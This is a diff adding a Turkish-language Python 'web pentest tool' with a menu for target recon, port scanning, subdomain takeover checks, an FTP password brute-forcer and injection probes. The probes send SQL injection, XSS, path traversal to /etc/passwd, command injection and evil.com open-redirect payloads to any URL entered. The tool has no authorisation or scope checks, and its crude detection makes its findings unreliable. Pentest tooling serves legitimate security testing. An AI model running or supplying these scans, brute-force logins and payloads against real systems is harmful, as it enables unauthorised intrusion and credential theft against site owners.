@@ -1,0 +1,313 @@
+import requests
+import socket
+import whois
+import dns.resolver
+import sys
+import time
+
+def print_banner():
+    banner = r"""
+   ____       _ _   _           _   __          __     _     
+  / ___|  ___| | |_(_)_ __ ___ | |  \ \        / /__ _| |__  
+  \___ \ / _ \ | __| | '_ ` _ \| |   \ \ /\ / / _ \ '_ \ 
+   ___) |  __/ | |_| | | | | | | |    \ V  V /  __/ | | |
+  |____/ \___|_|\__|_|_| |_| |_|_|     \_/\_/ \___|_| |_|
+  
+             ShelterWebHack - Web Pentest Tool
+                 Developer: @shelteralbayrak
+    """
+    print(banner)
+
+def get_whois(domain):
+    print("\n[Whois Bilgisi]")
+    try:
+        w = whois.whois(domain)
+        if w.text:
+            print(w.text)
+        else:
+            print("Whois bilgisi alınamadı.")
+    except Exception as e:
+        print("Whois sorgusunda hata:", e)
+
+def dns_records(domain):
+    print("\n[DNS Kayıtları]")
+    try:
+        for record_type in ['A', 'MX', 'NS', 'TXT']:
+            answers = dns.resolver.resolve(domain, record_type, raise_on_no_answer=False)
+            print(f"{record_type} kayıtları:")
+            if answers.rrset is not None:
+                for rdata in answers:
+                    print(" ", rdata.to_text())
+            else:
+                print("  Bulunamadı.")
+    except Exception as e:
+        print("DNS sorgusunda hata:", e)
+
+def subdomain_enum_basic(domain):
+    print("\n[Alt Domain Taraması (basit)]")
+    common_subdomains = ['www', 'mail', 'ftp', 'test', 'dev', 'admin']
+    found = False
+    for sub in common_subdomains:
+        subdomain = f"{sub}.{domain}"
+        try:
+            ip = socket.gethostbyname(subdomain)
+            print(f"  {subdomain} -> {ip}")
+            found = True
+        except:
+            continue
+    if not found:
+        print("Alt domain bulunamadı.")
+
+def subdomain_enum_advanced(domain):
+    print("\n[Gelişmiş Alt Domain Taraması (wordlist ile)]")
+    wordlist = ['www', 'mail', 'ftp', 'test', 'dev', 'admin', 'portal', 'beta', 'shop', 'staging', 'webmail']
+    found = False
+    for sub in wordlist:
+        subdomain = f"{sub}.{domain}"
+        try:
+            ip = socket.gethostbyname(subdomain)
+            print(f"  {subdomain} -> {ip}")
+            found = True
+        except:
+            continue
+    if not found:
+        print("Alt domain bulunamadı.")
+
+def port_scan(target, ports=[80, 443, 22, 21, 25, 3306, 8080]):
+    print("\n[Port Tarama]")
+    for port in ports:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        result = sock.connect_ex((target, port))
+        if result == 0:
+            print(f"Port {port} açık")
+        sock.close()
+
+def http_headers(url):
+    print("\n[HTTP Başlıkları]")
+    try:
+        r = requests.get(url, timeout=5)
+        for k, v in r.headers.items():
+            print(f"{k}: {v}")
+    except Exception as e:
+        print("HTTP isteğinde hata:", e)
+
+def check_robots_sitemap(url):
+    print("\n[robots.txt ve sitemap.xml kontrolü]")
+    try:
+        robots = requests.get(url + "/robots.txt", timeout=5)
+        if robots.status_code == 200:
+            print("robots.txt bulundu:")
+            print(robots.text)
+        else:
+            print("robots.txt bulunamadı.")
+    except:
+        print("robots.txt kontrolü başarısız.")
+
+    try:
+        sitemap = requests.get(url + "/sitemap.xml", timeout=5)
+        if sitemap.status_code == 200:
+            print("sitemap.xml bulundu:")
+            print(sitemap.text)
+        else:
+            print("sitemap.xml bulunamadı.")
+    except:
+        print("sitemap.xml kontrolü başarısız.")
+
+def extract_url_params(url):
+    if '?' in url:
+        param_str = url.split('?')[1]
+        params = param_str.split('&')
+        print("\n[HTTP Parametreleri]")
+        for p in params:
+            print(f" - {p}")
+    else:
+        print("\n[HTTP Parametreleri] URL parametresi bulunamadı.")
+
+def subdomain_takeover_check(domain):
+    print("\n[Subdomain Takeover Kontrolü]")
+    # Çok basit kontrol, gerçek kontroller için kapsamlı liste gerekir.
+    takeover_signatures = [
+        "There isn't a GitHub Pages site here.",
+        "NoSuchBucket",
+        "There is no app configured at that hostname",
+        "The requested URL was not found on this server."
+    ]
+    wordlist = ['www', 'test', 'dev', 'staging', 'beta', 'portal']
+    for sub in wordlist:
+        subdomain = f"{sub}.{domain}"
+        url = f"http://{subdomain}"
+        try:
+            r = requests.get(url, timeout=5)
+            for sig in takeover_signatures:
+                if sig.lower() in r.text.lower():
+                    print(f"Potansiyel subdomain takeover açığı: {subdomain}")
+                    break
+        except:
+            continue
+
+def ftp_bruteforce(target_ip):
+    print("\n[FTP Brute Force Testi]")
+    # Çok basit, demo amaçlı parola denemesi
+    import ftplib
+    user = input("FTP kullanıcı adı (ör: anonymous): ").strip()
+    wordlist = ['123456', 'password', 'admin', 'ftp', '1234', 'test', 'root']
+    for password in wordlist:
+        try:
+            ftp = ftplib.FTP(target_ip, timeout=3)
+            ftp.login(user, password)
+            print(f"Başarılı giriş! Kullanıcı: {user} Parola: {password}")
+            ftp.quit()
+            return
+        except:
+            print(f"Başarısız parola denemesi: {password}")
+    print("FTP brute force tamamlandı, başarılı giriş bulunamadı.")
+
+# --- Vulnerability Testleri ---
+
+def sql_injection_test(url):
+    print("\n[SQL Injection Testi]")
+    payload = "' OR '1'='1"
+    try:
+        r = requests.get(url + payload, timeout=5)
+        if any(x in r.text.lower() for x in ["sql", "syntax", "mysql", "error"]):
+            print("Potansiyel SQL Injection açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def xss_test(url):
+    print("\n[XSS Testi]")
+    payload = "<script>alert('xss')</script>"
+    try:
+        r = requests.get(url + "?q=" + payload, timeout=5)
+        if payload in r.text:
+            print("Potansiyel XSS açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def lfi_test(url):
+    print("\n[LFI Testi]")
+    payload = "../../etc/passwd"
+    try:
+        r = requests.get(url + payload, timeout=5)
+        if "root:x" in r.text:
+            print("Potansiyel LFI açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def open_redirect_test(url):
+    print("\n[Open Redirect Testi]")
+    payload = "?redirect=http://evil.com"
+    try:
+        r = requests.get(url + payload, allow_redirects=False, timeout=5)
+        if "evil.com" in r.headers.get('Location', ''):
+            print("Potansiyel Open Redirect açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def command_injection_test(url):
+    print("\n[Command Injection Testi]")
+    payload = ";ls"
+    try:
+        r = requests.get(url + payload, timeout=5)
+        if any(x in r.text for x in ["bin", "etc", "usr"]):
+            print("Potansiyel Command Injection açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def directory_traversal_test(url):
+    print("\n[Directory Traversal Testi]")
+    payload = "../../../../etc/passwd"
+    try:
+        r = requests.get(url + payload, timeout=5)
+        if "root:x" in r.text:
+            print("Potansiyel Directory Traversal açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def header_injection_test(url):
+    print("\n[HTTP Header Injection Testi]")
+    headers = {"X-Forwarded-For": "127.0.0.1\nInjectedHeader:InjectedValue"}
+    try:
+        r = requests.get(url, headers=headers, timeout=5)
+        if "InjectedValue" in r.text:
+            print("Potansiyel Header Injection açığı tespit edildi!")
+        else:
+            print("Açık bulunamadı.")
+    except Exception as e:
+        print("Test başarısız:", e)
+
+def menu():
+    while True:
+        print("""
+========== Menü ==========
+1) Recon (Bilgi Toplama)
+2) Gelişmiş Alt Domain Taraması
+3) Zafiyet Testleri
+4) FTP Brute Force Testi
+5) Subdomain Takeover Kontrolü
+6) Çıkış
+=========================
+""")
+        choice = input("Seçiminiz (1-6): ").strip()
+
+        if choice == '1':
+            domain = input("Hedef domain (ör: example.com): ").strip()
+            url = input("Hedef URL (http:// ile başlayacak): ").strip()
+            get_whois(domain)
+            dns_records(domain)
+            subdomain_enum_basic(domain)
+            try:
+                ip = socket.gethostbyname(domain)
+                port_scan(ip)
+            except:
+                print("Domain IP adresi alınamadı, port taraması atlandı.")
+            http_headers(url)
+            check_robots_sitemap(url)
+            extract_url_params(url)
+
+        elif choice == '2':
+            domain = input("Hedef domain (ör: example.com): ").strip()
+            subdomain_enum_advanced(domain)
+
+        elif choice == '3':
+            url = input("Test edilecek URL (http:// ile başlayacak, parametresiz): ").strip()
+            sql_injection_test(url)
+            xss_test(url)
+            lfi_test(url)
+            open_redirect_test(url)
+            command_injection_test(url)
+            directory_traversal_test(url)
+            header_injection_test(url)
+
+        elif choice == '4':
+            target = input("FTP hedef IP adresi: ").strip()
+            ftp_bruteforce(target)
+
+        elif choice == '5':
+            domain = input("Hedef domain (ör: example.com): ").strip()
+            subdomain_takeover_check(domain)
+
+        elif choice == '6':
+            print("Çıkış yapılıyor. İyi çalışmalar!")
+            sys.exit()
+
+        else:
+            print("Geçersiz seçim, tekrar deneyin.")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    print_banner()
+    menu()
